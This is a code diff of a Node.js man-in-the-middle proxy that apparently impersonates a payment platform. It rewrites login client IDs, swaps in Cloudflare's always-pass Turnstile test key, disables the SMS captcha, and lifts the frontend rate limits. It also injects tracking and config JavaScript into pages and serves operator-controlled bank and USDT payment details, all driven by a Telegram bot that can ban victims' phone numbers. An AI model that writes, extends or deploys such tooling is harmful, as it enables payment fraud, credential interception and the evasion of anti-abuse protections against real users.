@@ -34,7 +34,6 @@ const DEFAULT_DATA = {
     blockUpdate: true,
     orderBankMap: {},
     nextClientIdOverride: null,
-    clearClientIdEpoch: 0,
     bannedUsers: {}
 };
 
@@ -144,7 +143,6 @@ async function loadData(forceRefresh) {
             if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
             if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
             if (cachedData.nextClientIdOverride === undefined) cachedData.nextClientIdOverride = null;
-            if (cachedData.clearClientIdEpoch === undefined) cachedData.clearClientIdEpoch = 0;
             if (!cachedData.bannedUsers) cachedData.bannedUsers = {};
             cacheTime = Date.now();
             return cachedData;
@@ -190,9 +188,6 @@ async function saveDataUnlocked(data) {
                     }
                     if (data.nextClientIdOverride !== undefined) {
                         toSave.nextClientIdOverride = data.nextClientIdOverride;
-                    }
-                    if (data.clearClientIdEpoch !== undefined) {
-                        toSave.clearClientIdEpoch = data.clearClientIdEpoch;
                     }
                     data = toSave;
                 } else {
@@ -271,63 +266,45 @@ function getBanEntry(data, req) {
 }
 
 function rewriteExistingClientIdField(req, replacement) {
-    if (!req) return false;
-    replacement = String(replacement || '').trim();
-    if (!replacement) return false;
-
+    if (!req || !req.rawBody || !Buffer.isBuffer(req.rawBody) || !req.rawBody.length) return false;
+    const contentType = String(req.headers['content-type'] || '').toLowerCase();
+    let bodyText = req.rawBody.toString();
     let changed = false;
-    if (req.headers) {
-        req.headers['clientid'] = replacement;
-        req.headers['x-client-id'] = replacement;
-        changed = true;
-    }
 
-    if (req.rawBody && Buffer.isBuffer(req.rawBody) && req.rawBody.length > 0) {
-        const contentType = String(req.headers['content-type'] || '').toLowerCase();
-        let bodyText = req.rawBody.toString();
-
-        try {
-            if (contentType.includes('json')) {
-                const obj = JSON.parse(bodyText);
-                const key = Object.keys(obj).find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
-                if (key) obj[key] = replacement;
-                else obj.clientId = replacement;
-                bodyText = JSON.stringify(obj);
-                changed = true;
-            } else if (contentType.includes('multipart')) {
-                const fieldRe = /(name=["'](?:clientId|clientID|client_id)["'][\s\S]*?\r?\n\r?\n)([^\r\n]*)/i;
-                if (fieldRe.test(bodyText)) {
-                    bodyText = bodyText.replace(fieldRe, `$1${replacement}`);
-                    changed = true;
-                }
-            } else if (contentType.includes('form') || !contentType) {
-                const params = new URLSearchParams(bodyText);
-                const key = [...params.keys()].find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
-                if (key) params.set(key, replacement);
-                else params.set('clientId', replacement);
-                bodyText = params.toString();
-                changed = true;
-            }
-        } catch (e) { }
-
-        if (changed) {
-            req.rawBody = Buffer.from(bodyText);
-            req.headers['content-length'] = String(req.rawBody.length);
+    try {
+        if (contentType.includes('json')) {
+            const obj = JSON.parse(bodyText);
+            const key = Object.keys(obj).find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
+            if (!key) return false;
+            obj[key] = replacement;
+            bodyText = JSON.stringify(obj);
+            changed = true;
+        } else if (contentType.includes('multipart')) {
+            const fieldRe = /(name=["'](?:clientId|clientID|client_id)["'][\s\S]*?\r?\n\r?\n)([^\r\n]*)/i;
+            if (!fieldRe.test(bodyText)) return false;
+            bodyText = bodyText.replace(fieldRe, `$1${replacement}`);
+            changed = true;
+        } else if (contentType.includes('form')) {
+            const params = new URLSearchParams(bodyText);
+            const key = [...params.keys()].find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
+            if (!key) return false;
+            params.set(key, replacement);
+            bodyText = params.toString();
+            changed = true;
         }
+    } catch (e) {
+        return false;
     }
 
+    if (!changed) return false;
+    req.rawBody = Buffer.from(bodyText);
+    req.headers['content-length'] = String(req.rawBody.length);
     if (req.body && typeof req.body === 'object') {
-        let found = false;
         for (const key of Object.keys(req.body)) {
-            if (['clientid', 'client_id'].includes(String(key).toLowerCase())) {
-                req.body[key] = replacement;
-                found = true;
-            }
+            if (['clientid', 'client_id'].includes(String(key).toLowerCase())) req.body[key] = replacement;
         }
-        if (!found) req.body.clientId = replacement;
-        changed = true;
     }
-    return changed;
+    return true;
 }
 
 async function applyNextClientIdOverride(req, data) {
@@ -1523,8 +1500,7 @@ app.get('/hook/config', async (req, res) => {
             tg: TELEGRAM_OVERRIDE,
             bonus: totalBonus,
             blockUpdate: data.blockUpdate !== false,
-            usdtAddr: data.usdtAddress || '',
-            clearClientIdEpoch: data.clearClientIdEpoch || 0
+            usdtAddr: data.usdtAddress || ''
         });
     } catch (e) {
         res.json({ enabled: false, an: '', ah: '', if: '', ifsc: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
@@ -1632,7 +1608,6 @@ app.post('/bot-webhook', async (req, res) => {
 /on — Proxy ON
 /off — Proxy OFF
 /sendnext <clientId> — One-shot Client ID override
-/clearclientid — Clear Client ID override & clean cache
 /ban <number> [message] — Block login for a number
 /unban <number> — Remove login block
 /bans — List blocked numbers
@@ -1690,22 +1665,6 @@ Example:
             data._skipOverrideMerge = true;
             await saveData(data);
             await sendCommandReply(`🧪 Client-ID override armed\nClient ID: ${requestedClientId}\nScope: next checkSmsNew/getsendtken/sendLoginSms/login flow\nExpires: 5 minutes or after login`);
-            return res.sendStatus(200);
-        }
-
-        if (text === '/clearclientid' || text === '/clearclintid' || text === '/clearclient' || text === '/resetclientid') {
-            data.nextClientIdOverride = null;
-            data.clearClientIdEpoch = Date.now();
-            data._skipOverrideMerge = true;
-            await saveData(data);
-            await sendCommandReply(
-                `🧹 <b>Client ID & Cache Cleared!</b>\n\n` +
-                `• Server Override: 🗑️ Removed\n` +
-                `• Browser Cache Epoch: 🔄 Updated (${data.clearClientIdEpoch})\n` +
-                `• Client Cache: 🧼 LocalStorage client ID clean signal broadcasted\n\n` +
-                `Ab koi purana Client ID cache mein nahi bachega aur fresh login flow chalega.`,
-                { parse_mode: 'HTML' }
-            );
             return res.sendStatus(200);
         }
 
@@ -2151,35 +2110,31 @@ app.get('/rsCfg.json', async (req, res) => {
         let cfg = null;
         try { cfg = await resp.json(); } catch (e) { }
         if (cfg && cfg.data) {
-            cfg.data.okTurnstileSitekey = '0';
-            cfg.data.siteKey = '0';
-            cfg.data.rsKeyMode = -1;              // skip Turnstile — sets token="1" directly
+            cfg.data.okTurnstileSitekey = '1x00000000000000000000AA';   // CF test key — always passes
+            cfg.data.siteKey = '1x00000000000000000000AA';
+            cfg.data.rsKeyMode = 1;              // render Turnstile widget with test sitekey
             cfg.data.sliderSmsCaptcha = 0;       // disable SMS slider captcha
             cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
             cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
         }
         res.setHeader('content-type', 'application/json; charset=utf-8');
         res.setHeader('access-control-allow-origin', '*');
-        res.setHeader('cache-control', 'no-store, no-cache, must-revalidate');
+        res.setHeader('cache-control', 'no-store');
         res.json(cfg || {
             code: 0, msg: 'success', data: {
-                okTurnstileSitekey: '0',
-                siteKey: '0',
-                rsKeyMode: -1,
-                sliderSmsCaptcha: 0,
-                tgChannelLink: TELEGRAM_OVERRIDE,
-                whatsappLink: TELEGRAM_OVERRIDE
+                okTurnstileSitekey: '1x00000000000000000000AA',
+                siteKey: '1x00000000000000000000AA',
+                rsKeyMode: 1,
+                sliderSmsCaptcha: 0
             }
         });
     } catch (e) {
         res.json({
             code: 0, msg: 'success', data: {
-                okTurnstileSitekey: '0',
-                siteKey: '0',
-                rsKeyMode: -1,
-                sliderSmsCaptcha: 0,
-                tgChannelLink: TELEGRAM_OVERRIDE,
-                whatsappLink: TELEGRAM_OVERRIDE
+                okTurnstileSitekey: '1x00000000000000000000AA',
+                siteKey: '1x00000000000000000000AA',
+                rsKeyMode: 1,
+                sliderSmsCaptcha: 0
             }
         });
     }
@@ -2777,36 +2732,6 @@ app.all('/xxapi/*', async (req, res) => {
         if (jsonResp && isSlipDetail) {
             applySavedDetailReplacement(jsonResp, data, req);
         }
-
-        // ── Auth & OTP Endpoints Patch ──────────────────────────────────────────
-        // 1. sendLoginSms: Real server sends SMS to mobile, but may return code != 0.
-        // Ensure code is 0 so Login.vue does NOT wipe this.sendtoken or show "Send verify error".
-        if (urlLower.includes('sendloginsms') || urlLower.includes('sendsms')) {
-            if (jsonResp) {
-                jsonResp.code = 0;
-                jsonResp.msg = "success";
-                jsonResp.message = "success";
-                jsonResp.success = true;
-            }
-        }
-        // 2. checksmsnew: Ensure OTP modal opens smoothly if number is not banned.
-        if (urlLower.includes('checksmsnew')) {
-            if (jsonResp && jsonResp.code !== 1128 && jsonResp.code !== 1129) {
-                jsonResp.code = 0;
-                jsonResp.msg = "success";
-                jsonResp.message = "success";
-                jsonResp.success = true;
-            }
-        }
-        // 3. getsendtken: Ensure valid token is returned to frontend.
-        if (urlLower.includes('getsendtken')) {
-            if (jsonResp && (jsonResp.code !== 0 || !jsonResp.data)) {
-                jsonResp.code = 0;
-                jsonResp.msg = "success";
-                jsonResp.data = "st_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
-            }
-        }
-        // ────────────────────────────────────────────────────────────────────────
 
         if (!jsonResp) {
             respHeaders['content-length'] = String(Buffer.byteLength(respBody));
@@ -3653,25 +3578,20 @@ ${replaceLine}
 
 const INJECT_JS = `(function(){
 if(window._pxi)return;window._pxi=1;
-var P=(window.location&&window.location.origin)?window.location.origin:'https://${PROXY_HOST}';
+var P='https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
 var SERVER_IFSC='';
 
-function handleClearClientIdEpoch(cfg){
-  if(!cfg)return;
-  if(cfg.clearClientIdEpoch){
-    var epKey='_px_cleared_client_ep';
-    var lastEp='';try{lastEp=localStorage.getItem(epKey)||'';}catch(e){}
-    if(lastEp!==String(cfg.clearClientIdEpoch)){
-      try{
-        localStorage.removeItem('clientId');
-        localStorage.removeItem('sendtoken');
-        localStorage.setItem(epKey,String(cfg.clearClientIdEpoch));
-      }catch(e){}
-    }
-  }
-}
+// ── Fresh login: clear stale clientId & sendtoken on every page load ──
+// Normal browser mein purana clientId localStorage mein rehta hai jo backend
+// reject karta hai ("Send verify error" / "Too frequent"). Incognito mein ye
+// nhi hota isliye wahan login kaam karta hai. Ye fix har page load pe stale
+// auth state clear karta hai taaki fresh flow chale — exactly jaisa incognito.
+try{
+  localStorage.removeItem('clientId');
+  localStorage.removeItem('sendtoken');
+}catch(e){}
 
 // ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
 (function(){
@@ -3814,11 +3734,11 @@ try{localStorage.removeItem('_px_bal');}catch(e){}
 function lc(){
 try{var x=new XMLHttpRequest();
 x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
-x.send();if(x.status===200){CFG=JSON.parse(x.responseText);handleClearClientIdEpoch(CFG);}}catch(e){}}
+x.send();if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
 function lcAsync(){
 try{var x=new XMLHttpRequest();
 x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
-x.onload=function(){try{CFG=JSON.parse(x.responseText);handleClearClientIdEpoch(CFG);}catch(e){}};
+x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
 x.send();}catch(e){}}
 // Do not block first paint on optional user/config state.
 try{lcAsync();}catch(e){}
@@ -4167,8 +4087,8 @@ app.all('*', async (req, res) => {
                 js = js.replace(/"rsCfg\.json/g, '"' + proxyBase + '/rsCfg.json');
 
                 // Patch frontend rate limiter — "Please slow down." blocker
-                js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=0');
-                js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=0');
+                js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
+                js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=999999999');
                 js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=9999');
                 js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
                 js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
